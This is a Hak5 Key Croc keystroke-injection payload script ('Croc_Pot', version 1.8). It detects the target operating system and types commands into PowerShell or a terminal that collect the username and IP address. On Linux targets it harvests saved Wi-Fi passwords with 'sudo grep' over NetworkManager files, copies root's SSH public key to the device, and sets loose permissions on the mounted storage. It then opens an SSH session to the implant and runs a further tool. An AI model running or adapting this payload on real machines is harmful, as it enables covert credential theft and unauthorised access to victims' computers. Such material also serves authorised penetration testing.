# Title:         Croc_Pot Payload
# Description:   Start Croc_pot
# Author:        Spywill
# Version:       1.8
# Category:      Key Croc
#
#
MATCH crocpot
CROC_PW=ENTER PASSWD HERE
CROC_OS=/root/udisk/loot/Croc_OS.txt
cat > ${CROC_OS}
rm -f /root/udisk/loot/Croc_OS_wind.txt /root/udisk/loot/Croc_OS_ip.txt
ATTACKMODE AUTO_ETHERNET
LED ATTACK
GET TARGET_OS
GET TARGET_IP
GET HOST_IP
GET TARGET_HOSTNAME
case $TARGET_OS in
    WINDOWS)
           LED R
           ATTACKMODE HID STORAGE
           sleep 1
           Q GUI r
           sleep 1
           Q STRING "powershell"
           Q ENTER
           sleep 5
           Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
           Q ENTER
           sleep 1
           Q STRING "Test-Connection -ComputerName (hostname) -Count 1 | Select IPV4Address | Format-Table -AutoSize | Out-File -append \"\$Croc\loot\Croc_OS_wind.txt\""
           Q ENTER
           sleep 1
           Q STRING "\$env:UserName | Format-Table -AutoSize | Out-File -append \"\$Croc\loot\Croc_OS_wind.txt\""
           Q ENTER
           sleep 1
           ATTACKMODE HID
           sleep 1
           Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
           Q ENTER
           sleep 2
           Q STRING "${CROC_PW}"
           Q ENTER
           sleep 2
           echo "$TARGET_OS" >> ${CROC_OS}
           echo "$TARGET_IP" >> ${CROC_OS}
           echo "$TARGET_HOSTNAME" >> ${CROC_OS}
           echo "$HOST_IP" >> ${CROC_OS}
           Q STRING "/root/udisk/tools/Croc_Pot-1.sh"
           Q ENTER;;
      MACOS)
           ATTACKMODE HID
           LED G
           sleep 1
           Q GUI-SPACE
           sleep 1
           Q STRING "terminal"
           Q ENTER
           sleep 2
           Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
           Q ENTER
           sleep 2
           Q STRING "${CROC_PW}"
           Q ENTER
           sleep 1
           echo "$TARGET_OS" >> ${CROC_OS}
           echo "$TARGET_IP" >> ${CROC_OS}
           echo "$TARGET_HOSTNAME" >> ${CROC_OS}
           echo "$HOST_IP" >> ${CROC_OS}
           Q STRING "/root/udisk/tools/Croc_Pot-1.sh"
           Q ENTER;;
      LINUX)
           ATTACKMODE HID STORAGE
           LED B
           sleep 5
           case $TARGET_HOSTNAME in
raspberrypi) 
           Q GUI d
           sleep 1
           Q STRING "terminal"
           Q ENTER
           Q ENTER
           sleep 1
           Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/loot/Croc_OS_ip.txt"
           Q ENTER
           Q STRING "whoami | tee \${PC_USER}"
           Q ENTER
           sleep 1
           Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER}" 
           Q ENTER
           sleep 1
           Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | tee -a \${PC_USER}"
           Q ENTER
           sleep 1
           ATTACKMODE HID
           sleep 1
           Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
           Q ENTER
           sleep 1
           Q STRING "${CROC_PW}"
           Q ENTER
           echo "$TARGET_OS" | tee -a ${CROC_OS}
           echo "$TARGET_IP" | tee -a ${CROC_OS}
           echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
           echo "$HOST_IP" | tee -a ${CROC_OS}
           Q STRING "/root/udisk/tools/Croc_Pot-1.sh"
           Q ENTER;;
     parrot)
           Q ALT F2
           sleep 1
           Q STRING "mate-terminal"
           Q ENTER
           sleep 1
           Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/"
           Q ENTER
           Q STRING "${CROC_PW}"
           Q ENTER
           sleep 1
           Q STRING "sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0"
           Q ENTER
           sleep 1
           Q STRING "sudo chmod 777 /media/\$(whoami)/KeyCroc/"
           Q ENTER
           sleep 1
           Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/loot/Croc_OS_ip.txt"
           Q ENTER
           Q STRING "whoami | tee \${PC_USER}"
           Q ENTER
           sleep 1
           Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER}" 
           Q ENTER
           sleep 1
           Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | tee -a \${PC_USER}"
           Q ENTER
           sleep 1
           Q STRING "sudo cp /root/.ssh/id_rsa.pub /media/\$(whoami)/KeyCroc/loot"
           Q ENTER
           sleep 1
           Q STRING "sudo umount /media/\$(whoami)/KeyCroc/"
           Q ENTER
           sleep 1
           ATTACKMODE HID
           Q STRING "sudo rmdir /media/\$(whoami)/KeyCroc/"
           Q ENTER
           sleep 2
           Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
           Q ENTER
           sleep 1
           Q STRING "${CROC_PW}"
           Q ENTER
           echo "$TARGET_OS" | tee -a ${CROC_OS}
           echo "$TARGET_IP" | tee -a ${CROC_OS}
           echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
           echo "$HOST_IP" | tee -a ${CROC_OS}
           cp /root/udisk/loot/id_rsa.pub /root/.ssh
           rm /root/udisk/loot/id_rsa.pub
           Q STRING "/root/udisk/tools/Croc_Pot-1.sh"
           Q ENTER;;
          *)
           Q ALT F2
           sleep 1
           Q STRING "mate-terminal"
           Q ENTER
           sleep 1
           Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/"
           Q ENTER
           Q STRING "${CROC_PW}"
           Q ENTER
           sleep 1
           Q STRING "sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0"
           Q ENTER
           sleep 1
           Q STRING "sudo chmod 777 /media/\$(whoami)/KeyCroc/"
           Q ENTER
           sleep 1
           Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/loot/Croc_OS_ip.txt"
           Q ENTER
           Q STRING "whoami | tee \${PC_USER}"
           Q ENTER
           sleep 1
           Q STRING "ip -4 -o addr show wlan0 | awk '{print \$4}' | cut -d \"/\" -f 1 | tee -a \${PC_USER}" 
           Q ENTER
           sleep 1
           Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | tee -a \${PC_USER}"
           Q ENTER
           sleep 1
           Q STRING "sudo umount /media/\$(whoami)/KeyCroc/"
           Q ENTER
           sleep 1
           ATTACKMODE HID
           Q STRING "sudo rmdir /media/\$(whoami)/KeyCroc/"
           Q ENTER
           sleep 2
           Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
           Q ENTER
           sleep 1
           Q STRING "${CROC_PW}"
           Q ENTER
           echo "$TARGET_OS" | tee -a ${CROC_OS}
           echo "$TARGET_IP" | tee -a ${CROC_OS}
           echo "$TARGET_HOSTNAME" | tee -a ${CROC_OS}
           echo "$HOST_IP" | tee -a ${CROC_OS}
           Q STRING "/root/udisk/tools/Croc_Pot-1.sh"
           Q ENTER;;
      esac
    ;;
esac
